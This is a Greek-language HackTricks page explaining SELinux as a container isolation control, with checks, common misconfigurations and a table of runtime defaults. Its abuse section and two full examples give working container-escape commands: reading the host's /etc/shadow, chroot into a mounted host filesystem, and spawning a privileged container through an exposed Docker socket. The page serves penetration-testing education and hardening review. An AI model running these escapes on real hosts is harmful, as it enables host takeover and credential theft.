# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## Επισκόπηση

Το SELinux είναι ένα σύστημα **υποχρεωτικού ελέγχου πρόσβασης (Mandatory Access Control) βασιζόμενο σε ετικέτες**. Κάθε σχετική διεργασία και αντικείμενο μπορεί να φέρει ένα πλαίσιο ασφάλειας, και η πολιτική καθορίζει ποιοι τομείς (domains) μπορούν να αλληλεπιδράσουν με ποιους τύπους και με ποιον τρόπο. Σε περιβάλλοντα με container, αυτό συνήθως σημαίνει ότι το runtime εκκινεί τη διεργασία του container υπό έναν περιορισμένο container domain και επισημαίνει το περιεχόμενο του container με αντίστοιχους τύπους. Αν η πολιτική λειτουργεί σωστά, η διεργασία μπορεί να διαβάζει και να γράφει τα αντικείμενα που η ετικέτα της αναμένεται να αγγίξει, ενώ της αρνείται η πρόσβαση σε άλλο περιεχόμενο του host, ακόμα κι αν αυτό το περιεχόμενο γίνει ορατό μέσω mount.

Αυτή είναι μία από τις πιο ισχυρές προστασίες στην πλευρά του host που υπάρχουν σε mainstream Linux container deployments. Είναι ιδιαίτερα σημαντική σε Fedora, RHEL, CentOS Stream, OpenShift και άλλα οικοσυστήματα επικεντρωμένα στο SELinux. Σε αυτά τα περιβάλλοντα, ένας αναθεωρητής που αγνοεί το SELinux συχνά παρεξηγεί γιατί μια προφανής διαδρομή προς τον συμβιβασμό του host είναι στην πραγματικότητα μπλοκαρισμένη.

## AppArmor έναντι SELinux

Η πιο απλή διαφορά σε υψηλό επίπεδο είναι ότι το AppArmor βασίζεται σε μονοπάτια (path-based), ενώ το SELinux είναι **βασισμένο σε ετικέτες**. Αυτό έχει σημαντικές συνέπειες για την ασφάλεια των container. Μια πολιτική βασισμένη σε μονοπάτια μπορεί να συμπεριφερθεί διαφορετικά αν το ίδιο περιεχόμενο του host γίνει ορατό υπό μια απρόσμενη διαδρομή mount. Μια πολιτική βασισμένη σε ετικέτες, αντίθετα, ρωτά ποια είναι η ετικέτα του αντικειμένου και τι μπορεί να κάνει το domain της διεργασίας σε αυτό. Αυτό δεν κάνει το SELinux απλό, αλλά το καθιστά ανθεκτικό απέναντι σε μια κατηγορία υποθέσεων για κόλπα με διαδρομές που οι αμυνόμενοι μερικές φορές κάνουν κατά λάθος σε συστήματα βασισμένα σε AppArmor.

Επειδή το μοντέλο είναι προσανατολισμένο στις ετικέτες, ο χειρισμός των container volumes και οι αποφάσεις relabeling είναι κρίσιμες για την ασφάλεια. Αν το runtime ή ο operator αλλάξουν τις ετικέτες πολύ ευρέως για να «κάνουν τα mounts να δουλέψουν», το όριο της πολιτικής που υποτίθεται ότι περιέχει το workload μπορεί να γίνει πολύ πιο αδύναμο από το προβλεπόμενο.

## Εργαστήριο

Για να δείτε αν το SELinux είναι ενεργό στον host:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Για να ελέγξετε τις υπάρχουσες ετικέτες στον host:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Για να συγκρίνετε μια κανονική εκτέλεση με μία όπου η επισήμανση είναι απενεργοποιημένη:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Σε ένα host με ενεργοποιημένο SELinux, αυτή είναι μια πολύ πρακτική επίδειξη, επειδή δείχνει τη διαφορά μεταξύ ενός workload που τρέχει κάτω από το αναμενόμενο container domain και ενός που έχει αφαιρεθεί από αυτό το enforcement layer.

## Χρήση κατά το runtime

Το Podman εναρμονίζεται ιδιαίτερα καλά με το SELinux σε συστήματα όπου το SELinux είναι μέρος της προεπιλογής της πλατφόρμας. Το Rootless Podman μαζί με το SELinux είναι μία από τις ισχυρότερες mainstream βάσεις για containers, γιατί η διεργασία είναι ήδη μη προνομιακή από την πλευρά του host και εξακολουθεί να περιορίζεται από την πολιτική MAC. Το Docker μπορεί επίσης να χρησιμοποιήσει SELinux όπου υποστηρίζεται, αν και οι διαχειριστές μερικές φορές το απενεργοποιούν για να παρακάμψουν friction στη σήμανση volumes. Το CRI-O και το OpenShift βασίζονται σε μεγάλο βαθμό στο SELinux ως μέρος της ιστορίας απομόνωσης container. Το Kubernetes μπορεί επίσης να εκθέσει ρυθμίσεις που σχετίζονται με το SELinux, αλλά η αξία τους προφανώς εξαρτάται από το αν το node OS πράγματι υποστηρίζει και επιβάλλει SELinux.

Το επαναλαμβανόμενο μάθημα είναι ότι το SELinux δεν είναι προαιρετικό διακοσμητικό. Στα οικοσυστήματα που χτίζονται γύρω του, αποτελεί μέρος των αναμενόμενων ορίων ασφαλείας.

## Λανθασμένες ρυθμίσεις

Το κλασικό λάθος είναι `label=disable`. Σε επιχειρησιακό επίπεδο, αυτό συμβαίνει συχνά επειδή ένας volume mount απορρίφθηκε και η ταχύτερη βραχυπρόθεσμη λύση ήταν να αφαιρεθεί το SELinux από την εξίσωση αντί να διορθωθεί το μοντέλο labeling. Είναι επίσης σημαντικό να μην συγχέεται το **εγκατεστημένο** SELinux με το **αποτελεσματικό** SELinux. Ένας host μπορεί να υποστηρίζει SELinux και να βρίσκεται ακόμα σε permissive mode, ή το runtime να μην εκκινεί το workload κάτω από το αναμενόμενο domain. Σε αυτές τις περιπτώσεις, η προστασία είναι πολύ πιο αδύναμη από ό,τι μπορεί να υποδηλώνει η τεκμηρίωση.

Ένα άλλο κοινό λάθος είναι η λανθασμένη επανεπισημείωση (relabeling) του host content. Ευρείες ενέργειες επανεπισημείωσης μπορεί να κάνουν την εφαρμογή να λειτουργήσει, αλλά μπορούν επίσης να διευρύνουν το τι επιτρέπεται στο container να αγγίξει πολύ πέρα από το αρχικά προοριζόμενο.

## Κατάχρηση

Όταν το SELinux απουσιάζει, είναι σε permissive mode, ή είναι γενικά απενεργοποιημένο για το workload, οι διαδρομές mounted στον host γίνονται πολύ πιο εύκολες στην κατάχρηση. Το ίδιο bind mount που αλλιώς θα είχε περιοριστεί από labels μπορεί να γίνει άμεση οδός προς δεδομένα του host ή τροποποίηση του host. Αυτό είναι ιδιαίτερα σχετικό όταν συνδυάζεται με writable volume mounts, container runtime directories ή επιχειρησιακά shortcuts που έκαναν exposed ευαίσθητα host paths για ευκολία.

Το SELinux συχνά εξηγεί γιατί ένα generic breakout writeup δουλεύει αμέσως σε έναν host αλλά αποτυγχάνει επανειλημμένα σε έναν άλλο, παρόλο που τα runtime flags φαίνονται παρόμοια. Το ελλείπον στοιχείο συχνά δεν είναι ένα namespace ή μια capability, αλλά ένα όριο label που παρέμεινε ανέπαφο.

Ο ταχύτερος πρακτικός έλεγχος είναι να συγκρίνετε το ενεργό context και μετά να δοκιμάσετε τις mounted host paths ή τα runtime directories που κανονικά θα ήταν περιορισμένα από labels:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Εάν υπάρχει host bind mount και το SELinux labeling έχει απενεργοποιηθεί ή εξασθενήσει, η αποκάλυψη πληροφοριών συχνά προηγείται:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Αν το mount είναι εγγράψιμο και το container είναι ουσιαστικά host-root από την οπτική του kernel, το επόμενο βήμα είναι να δοκιμάσουμε ελεγχόμενη τροποποίηση του host αντί να μαντεύουμε:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Σε SELinux-capable hosts, η απώλεια ετικετών γύρω από τους καταλόγους κατάστασης χρόνου εκτέλεσης μπορεί επίσης να εκθέσει άμεσες διαδρομές privilege-escalation:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Αυτές οι εντολές δεν αντικαθιστούν μια πλήρη escape chain, αλλά δείχνουν πολύ γρήγορα αν το SELinux ήταν αυτό που απέτρεπε την πρόσβαση σε δεδομένα του host ή την τροποποίηση αρχείων στο host.

### Full Example: SELinux Disabled + Writable Host Mount

Αν η σήμανση του SELinux είναι απενεργοποιημένη και το σύστημα αρχείων του host είναι mounted ως εγγράψιμο στο `/host`, μια πλήρης host escape γίνεται μια κανονική περίπτωση κατάχρησης bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Αν το `chroot` επιτύχει, το container process πλέον λειτουργεί από το host filesystem:
```bash
id
hostname
cat /etc/passwd | tail
```
### Πλήρες Παράδειγμα: SELinux Disabled + Runtime Directory

Αν το workload μπορεί να προσεγγίσει ένα runtime socket μόλις τα labels απενεργοποιηθούν, το escape μπορεί να ανατεθεί στο runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Η σχετική παρατήρηση είναι ότι το SELinux συχνά λειτουργούσε ως ο έλεγχος που εμπόδιζε ακριβώς αυτό το είδος πρόσβασης σε host-path ή runtime-state.

## Έλεγχοι

Ο στόχος των SELinux ελέγχων είναι να επιβεβαιώσουν ότι το SELinux είναι ενεργοποιημένο, να εντοπίσουν το τρέχον security context, και να διαπιστώσουν εάν τα αρχεία ή οι διαδρομές που σας ενδιαφέρουν είναι πραγματικά label-confined.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Τι είναι ενδιαφέρον εδώ:

- `getenforce` θα πρέπει ιδανικά να επιστρέφει `Enforcing`; `Permissive` ή `Disabled` αλλάζουν το νόημα ολόκληρης της ενότητας SELinux.
- Εάν το τρέχον process context φαίνεται απρόσμενο ή υπερβολικά ευρύ, το workload ενδέχεται να μην εκτελείται υπό την προοριζόμενη container policy.
- Εάν host-mounted files ή runtime directories έχουν labels που η διαδικασία μπορεί να προσπελάσει πολύ ελεύθερα, τα bind mounts γίνονται πολύ πιο επικίνδυνα.

Όταν εξετάζετε ένα container σε πλατφόρμα ικανή για SELinux, μην αντιμετωπίζετε το labeling ως δευτερεύουσα λεπτομέρεια. Σε πολλές περιπτώσεις είναι ένας από τους κύριους λόγους που ο host δεν έχει ήδη παραβιαστεί.

## Προεπιλογές χρόνου εκτέλεσης

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένες χειροκίνητες αποδυναμώσεις |
| --- | --- | --- | --- |
| Docker Engine | Εξαρτώμενο από τον host | Η διαχωρισμένη λειτουργία SELinux είναι διαθέσιμη σε hosts με SELinux ενεργοποιημένο, αλλά η ακριβής συμπεριφορά εξαρτάται από τη ρύθμιση host/daemon | `--security-opt label=disable`, εκτεταμένο relabeling των bind mounts, `--privileged` |
| Podman | Συνήθως ενεργοποιημένο σε hosts με SELinux | Ο διαχωρισμός SELinux αποτελεί κανονικό μέρος του Podman σε συστήματα SELinux εκτός εάν απενεργοποιηθεί | `--security-opt label=disable`, `label=false` in `containers.conf`, `--privileged` |
| Kubernetes | Δεν ανατίθεται γενικά αυτόματα σε επίπεδο Pod | Υπάρχει υποστήριξη SELinux, αλλά τα Pods συνήθως χρειάζονται `securityContext.seLinuxOptions` ή πλατφόρμα-specific defaults; απαιτείται υποστήριξη runtime και node | ασθενή ή ευρεία `seLinuxOptions`, εκτέλεση σε permissive/disabled nodes, πολιτικές πλατφόρμας που απενεργοποιούν το labeling |
| CRI-O / OpenShift style deployments | Συνήθως βασίζεται βαριά | Το SELinux είναι συχνά βασικό μέρος του μοντέλου απομόνωσης node σε αυτά τα περιβάλλοντα | προσαρμοσμένες πολιτικές που διευρύνουν υπερβολικά την πρόσβαση, απενεργοποίηση της labeling για συμβατότητα |

Οι προεπιλογές του SELinux εξαρτώνται περισσότερο από τη διανομή σε σύγκριση με τις προεπιλογές του seccomp. Σε συστήματα τύπου Fedora/RHEL/OpenShift, το SELinux είναι συχνά κεντρικό στο μοντέλο απομόνωσης. Σε μη-SELinux συστήματα, απλά απουσιάζει.
